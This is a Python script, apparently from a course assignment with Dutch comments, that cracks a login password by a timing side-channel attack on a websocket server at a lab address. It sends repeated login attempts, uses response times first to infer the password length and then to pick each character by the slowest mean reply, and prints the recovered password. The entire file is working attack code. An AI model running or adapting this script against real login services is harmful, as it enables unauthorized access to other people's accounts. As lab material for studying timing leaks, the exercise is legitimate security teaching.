import asyncio, websockets
import json
from statistics import mean
import time

amount = 100 #Hoeveelheid pogingen per leter in alphabet
alphabet = "abcdefghijklmnopqrstuvwxyz1234567890" #elke character die geprobeerd moet worden
studentcode = '000000' #code van de student die je wilt kraken (username)

def Dict_Create():
    """
    Dict_Create makes a dictionary with each letter in the alphabet in it, every letter has a list attached to it.
    """
    Dict = {
        "a":[],
        "b":[],
        "c":[],
        "d":[],
        "e":[],
        "f":[],
        "g":[],
        "h":[],
        "i":[],
        "j":[],
        "k":[],
        "l":[],
        "m":[],
        "n":[],
        "o":[],
        "p":[],
        "q":[],
        "r":[],
        "s":[],
        "t":[],
        "u":[],
        "v":[],
        "w":[],
        "x":[],
        "y":[],
        "z":[],
        "1":[],
        "2":[],
        "3":[],
        "4":[],
        "5":[],
        "6":[],
        "7":[],
        "8":[],
        "9":[],
        "0":[]
    }
    return(Dict)

Dict3 = {
        "b":[],
        "bb":[],
        "bbb":[],
        "bbbb":[],
        "bbbbb":[],
        "bbbbbb":[],
        "bbbbbbb":[],
        "bbbbbbbb":[]
    }

Dict4 = {
        "b":[],
        "bb":[],
        "bbb":[],
        "bbbb":[],
        "bbbbb":[],
        "bbbbbb":[],
        "bbbbbbb":[],
        "bbbbbbbb":[]
    }

async def client_connect(username, password):
    """Handle sending and receiving logins to/from the server.
    'while True' structure prevents singular network/socket
    errors from causing full code to fail.

    --- laat deze functie onaangetast ---
    
    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
    """
    
    server_address = "ws://192.168.1.10:3840"
    err_count=0
    while True:
        try:
            time_before = time.perf_counter()
            async with websockets.connect(server_address) as websocket:
                await websocket.send(json.dumps([username,password]))
                reply = await websocket.recv()
            time_after = time.perf_counter()
            time_delta = time_after-time_before
            if err_count != 0:
                print(err_count)
                err_count=0
            return json.loads(reply), time_delta
        except:
            err_count+=1
            continue

# Basic function for calling server
def call_server(username, password):
    """Send a login attempt to the server and return the response.

    --- deze functie mag je aanpassen ---
    
    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
        (time_after-time_before) -- int of response time for attempt
    """
    
    reply, time_delta = asyncio.get_event_loop().\
            run_until_complete(client_connect(username,password))
    if reply[-15:] == 'Access Granted!':
        print('Correct password found: {}'.format(password))
    time.sleep(0.001) # Make sure to wait so as to not overload the server!
    return reply, time_delta



def List_Gen(Password_Length):
    """
    Creates the list according to the length of the password, so that all characters can be replaced.
    Parameters
    ----------
        Password_Length -- Length of the password
    Returns
    -------
        guess_line -- List with Password_Length amount of questionmarks
    """
    guess_line = []
    for _ in range(Password_Length):
        guess_line += '?'
    print(guess_line)
    return(guess_line)

def guess(Password_Length, guess_line):
    """
    Guess the password using statistics of server response times for each possible character at each position.
    Parameters:
    -----------
    Password_Length: int
        The length of the password to guess.
    guess_line: list
        A list representing the password being guessed, where each character is initially set to '?'.
    Returns:
    --------
    str:
        The guessed password as a string.
    """
    character = 0
    for z in range(Password_Length):
        #every time we switch to the next letter, clear the dictionaries
        Dict = Dict_Create()
        Dict2 = Dict_Create()
        Dict3 = Dict_Create()
        for _ in range(amount):
            char = 'abcdefghijklmnopqrstuvwxyz1234567890'
            for x in char:
                #every character is being sent to the server once per loop cycle
                guess_line[character] = x
                start = time.time()
                call_server(studentcode, ''.join(str(x) for x in guess_line))
                end = time.time()
                elapsed_time = end - start
                Dict[x].append(elapsed_time)
        
        for x in Dict:
            #Filter alle uitwijkingen eruit (packet drops door TCP), om zo een accurater gemiddelde te krijgen
            gemiddeld = mean(Dict[x])
            for y in Dict[x]:
                if y <= (gemiddeld * 1.1) and y >= (gemiddeld * 0.9):
                    Dict3[x].append(y)
     
        for x in Dict:
            Dict2[x].append(mean(Dict3[x]))
        hoogste = (max(zip(Dict2.values(), Dict2.keys())))
        guess_line[character] = hoogste[1]
        character += 1
        print(guess_line)
    return(''.join(str(x) for x in guess_line))

def guess_password_length():
    """
    Guesses the length of the password by sending requests with a different string length multiple times
    Parameters:
    -----------
    None

    Returns:
    --------
    int:
        password length (len(hoogste[1]))
    """
    Dict_Create()
    char = ''
    for _ in range(8):
        char += 'b'
        for x in range(amount):
            start = time.time()
            call_server(studentcode, char)
            end = time.time()
            elapsed_time = end - start
            if elapsed_time <= 0.055 and elapsed_time >= 0.03:    
                Dict3[char].append(elapsed_time)
            else:
                pass
    for x in Dict3:
        Dict4[x].append(mean(Dict3[x]))
    hoogste=(max(zip(Dict4.values(), Dict4.keys())))
    return(len(hoogste[1]))


Password_Length = guess_password_length()
print(Password_Length)
guess_line = List_Gen(Password_Length)
Password = guess(Password_Length, guess_line)
print(Password)
print(call_server(studentcode,Password))